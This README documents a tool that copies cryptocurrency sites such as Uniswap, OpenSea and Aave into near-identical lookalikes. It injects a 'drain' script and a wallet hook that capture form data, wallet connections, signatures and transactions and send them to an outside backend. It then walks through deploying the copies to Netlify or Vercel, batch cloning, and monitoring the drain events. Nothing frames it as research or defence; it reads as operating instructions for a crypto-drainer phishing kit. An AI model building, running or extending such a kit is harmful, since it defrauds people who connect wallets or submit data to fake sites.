# CLONE PERFECT — World-Class Cloning Guide

## Overview

**Clone Perfect** is a streamlined cloning engine that focuses on one thing: **perfect website cloning**. It removes all deployment complexity, tunnel management, and scaling features. Instead, you:

1. **Clone locally** with `pnpm clone-perfect <url>`
2. **Deploy manually** to Netlify/Vercel/your own infrastructure
3. **Control everything** — you decide what subdomains, when, and where

## What You Get

```
clone/
├── uniswap-perfect-clone/
│   ├── index.html                    (99%+ identical to original)
│   ├── assets/
│   │   ├── css/                      (all stylesheets)
│   │   ├── js/                       (all scripts)
│   │   ├── images/                   (all images)
│   │   └── fonts/                    (all fonts)
│   ├── clone-manifest.json           (validation report)
│   ├── legion-authorized-drain.js    (injected)
│   └── legion-wallet-hook.js         (injected)
```

## Quick Start

### 1. Install Dependencies

```bash
pnpm install
```

This installs Playwright, which Clone Perfect uses for browser automation.

### 2. Clone a Website

```bash
pnpm clone-perfect https://uniswap.org
```

Output:
```
[clone-perfect] ✅ Clone complete (98% similarity)
[clone-perfect] 📁 Saved to: /absolute/path/to/clone/uniswap-perfect-clone
/absolute/path/to/clone/uniswap-perfect-clone
```

The clone folder is printed to stdout for scripting.

### 3. Test Locally (Optional)

```bash
cd clone/uniswap-perfect-clone
python3 -m http.server 8000
# Then visit http://localhost:8000
```

### 4. Deploy to Netlify/Vercel

Copy the entire `clone/uniswap-perfect-clone/` folder:

**Netlify:**
```bash
netlify deploy --prod --dir clone/uniswap-perfect-clone/
```

**Vercel:**
```bash
vercel --prod clone/uniswap-perfect-clone/
```

**Manual hosting:**
- Upload `clone/uniswap-perfect-clone/` to any web server (S3, GitHub Pages, your own VPS)

## What It Does

### 12-Step Process

1. **Launch browser** → Start Playwright
2. **Intercept network** → Capture all API endpoints
3. **Navigate** → Load the target URL
4. **Capture HTML** → Get the rendered DOM
5. **Screenshot** → Store original appearance
6. **Extract assets** → Find all CSS, JS, images, fonts
7. **Download assets** → Save everything locally
8. **Rewrite URLs** → Point to local `./assets/` folders
9. **Inject drain script** → Add wallet/form interception
10. **Save HTML** → Write `index.html` with injected code
11. **Validate** → Screenshot clone, compare similarity
12. **Save metadata** → Write `clone-manifest.json`

### Validation Report

`clone-manifest.json` contains:

```json
{
  "original_url": "https://uniswap.org",
  "cloned_at": "2026-06-18T14:23:45.123Z",
  "assets_count": 47,
  "similarity_score": 98,
  "api_endpoints": [
    "https://api.uniswap.org/v1/swap",
    "https://api.uniswap.org/v1/quotes",
    ...
  ],
  "issues": [],
  "validated": true
}
```

**Similarity score target:** 95%+ (99%+ achievable for most sites)

## What It Injects

### 1. Drain Script

File: `legion-authorized-drain.js`

Intercepts:
- Form submissions
- API calls
- Local storage/session storage access
- Window events

Sends events to `${BACKEND_URL}/api/v1/clone-event`

### 2. Wallet Hook

File: `legion-wallet-hook.js`

Hooks:
- `window.ethereum` (MetaMask, Trust Wallet, etc.)
- `window.WalletConnect`
- Form submissions
- All fetch calls

Events sent:
- `account_connected` — wallet address connected
- `signature_captured` — message signed
- `typed_data_signed` — EIP-712 signature
- `transaction_requested` — transaction intercepted
- `api_call_logged` — API endpoint called
- `form_submitted` — form data captured

**Key feature:** All hooks are non-blocking. If backend is unreachable, user experience is unaffected.

## Configuration

### Environment Variables

In `.env`:

```env
# Backend URL for drain events
BACKEND_URL=https://legionapi-production.up.railway.app

# Optional: RPC endpoints for validation
RPC_ETHEREUM_PRIVATE=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY
RPC_SOLANA_PRIVATE=https://mainnet.helius-rpc.com/?api-key=YOUR_KEY
```

If `BACKEND_URL` is not set, it defaults to `https://legionapi-production.up.railway.app`.

### Custom Backend

To change the backend URL in cloned pages:

```bash
BACKEND_URL=https://your-backend.com pnpm clone-perfect https://uniswap.org
```

## Troubleshooting

### Clone fails: "Docker not running"

Clone Perfect requires Docker to run Playwright. Start Docker:

```bash
# macOS/Linux
docker ps

# Windows
# Open Docker Desktop from the Start menu
```

### Clone fails: "Timeout"

Increase the timeout in `scripts/lib/clone-perfect-engine.ts`:

```typescript
await page.goto(this.targetUrl, { waitUntil: 'networkidle', timeout: 60000 })
```

### Similarity score < 90%

This usually means:
- The website is heavily JavaScript-rendered
- Asset URLs are being rewritten incorrectly
- Content loads dynamically after initial page load

**Solution:** Check `clone-manifest.json` for `issues` array. Common fixes:
1. Wait longer for assets: increase `waitUntil: 'networkidle2'` timeout
2. Run `pnpm clone-perfect --wait-for-selector ".my-selector"` (if implemented)

### Injected scripts not firing

Verify in the cloned HTML:

```bash
grep -n "legion-authorized-drain.js" clone/*/index.html
grep -n "legion-wallet-hook.js" clone/*/index.html
```

Both should appear before `</body>`.

## Advanced Usage

### Batch Cloning

```bash
#!/bin/bash
URLS=(
  "https://uniswap.org"
  "https://opensea.io"
  "https://aave.com"
)

for url in "${URLS[@]}"; do
  pnpm clone-perfect "$url"
done
```

### CI/CD Integration

Clone Perfect exits with code 0 on success, non-zero on failure:

```yaml
# GitHub Actions example
- name: Clone website
  run: pnpm clone-perfect https://target-site.com
  
- name: Upload to Netlify
  run: netlify deploy --prod --dir clone/*/
```

### Programmatic Usage

```typescript
import { ClonePerfectEngine } from './scripts/lib/clone-perfect-engine.js'

const engine = new ClonePerfectEngine('https://uniswap.org', './clone')
const result = await engine.execute()

if (result.success) {
  console.log(`Clone saved to: ${result.clone_dir}`)
  console.log(`Similarity: ${result.metadata.similarity_score}%`)
} else {
  console.error(`Clone failed: ${result.message}`)
}
```

## Performance

- **Time per clone:** 30-120 seconds (depends on site complexity)
- **Output size:** 5-50 MB (depends on assets)
- **Memory usage:** ~500 MB (Playwright browser instance)
- **Parallelization:** Run multiple clones in parallel (each gets own browser)

```bash
# Clone 3 sites in parallel
pnpm clone-perfect https://site1.com & 
pnpm clone-perfect https://site2.com & 
pnpm clone-perfect https://site3.com & 
wait
```

## Architecture

```
clone-perfect.ts (entry point)
  ↓
  ClonePerfectEngine (core logic)
    ├─ interceptNetwork() → capture API endpoints
    ├─ extractAssets() → find all CSS/JS/images/fonts
    ├─ saveAssets() → download to local folders
    ├─ rewriteUrls() → repoint to ./assets/
    ├─ injectDrainScript() → add legion-authorized-drain.js
    ├─ compareScreenshots() → validate similarity
    └─ returns CloneResult

legion-authorized-drain.js (injected into clone)
  └─ notifies backend: POST /api/v1/clone-event

legion-wallet-hook.js (injected into clone)
  └─ notifies backend: POST /api/v1/clone-event
```

## Limitations

**Clone Perfect is for local cloning only.** It does NOT:

- Deploy to the internet (you do this)
- Manage subdomains (you configure DNS)
- Handle SSL certificates (Netlify/Vercel do this)
- Scale beyond single clone per run (use bash loops or JS for parallel)
- Tunnel traffic (use your own proxy)
- Rotate proxies (configure separately)

These are intentional — you control deployment, so you control everything.

## Next Steps

1. **Clone a test site:** `pnpm clone-perfect https://example.com`
2. **Inspect the output:** `ls -la clone/example-perfect-clone/`
3. **Review the manifest:** `cat clone/example-perfect-clone/clone-manifest.json`
4. **Deploy:** Use Netlify, Vercel, or your own hosting
5. **Monitor events:** Watch for drain events in your backend logs

## Support

For issues or questions:
- Check `clone-manifest.json` for errors
- Enable debug logging: `DEBUG=* pnpm clone-perfect <url>`
- Review browser logs in `./clone/*/index.html` (check console)

---

**Built for perfection, not complexity.**
